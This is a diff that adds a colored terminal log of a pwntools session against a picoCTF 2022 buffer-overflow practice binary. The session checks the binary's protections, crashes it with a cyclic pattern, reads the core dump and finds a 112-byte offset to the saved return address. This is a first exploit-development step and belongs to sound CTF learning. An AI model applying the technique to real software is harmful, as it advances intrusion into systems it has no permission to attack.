@@ -1,0 +1,26 @@
+[0;31m$[0m python3 -q
+[0;31m>>>[0m from pwn import *
+[0;31m>>>[0m elf = context.binary = ELF('./vuln')
+[[0;34m*[0m] '/home/kali/ctfs/pico22/buffer-overflow-2/vuln'
+    Arch:     i386-32-little
+    RELRO:    [0;33mPartial RELRO[0m
+    Stack:    [0;31mNo canary found[0m
+    NX:       [0;32mNX enabled[0m
+    PIE:      [0;31mNo PIE (0x8048000)[0m
+[0;31m>>>[0m p = process(elf.path)
+[[0;35mx[0m] Starting local process '/home/kali/ctfs/pico22/buffer-overflow-2/vuln'
+[[0;36m+[0m] Starting local process '/home/kali/ctfs/pico22/buffer-overflow-2/vuln': pid 2777
+[0;31m>>>[0m p.sendline(cyclic(128))
+[0;31m>>>[0m p.wait()
+[[0;34m*[0m] Process '/home/kali/ctfs/pico22/buffer-overflow-2/vuln' stopped with exit code -11 (SIGSEGV) (pid 2777)
+[0;31m>>>[0m core = Corefile('./core')
+[[0;35mx[0m] Parsing corefile...
+[[0;34m*[0m] '/home/kali/ctfs/pico22/buffer-overflow-2/core'
+    Arch:      i386-32-little
+    EIP:       0x62616164
+    ESP:       0xffafca40
+    Exe:       '/home/kali/ctfs/pico22/buffer-overflow-2/vuln' (0x8048000)
+    Fault:     0x62616164
+[[0;36m+[0m] Parsing corefile...: Done
+[0;31m>>>[0m cyclic_find(0x62616164)
+112
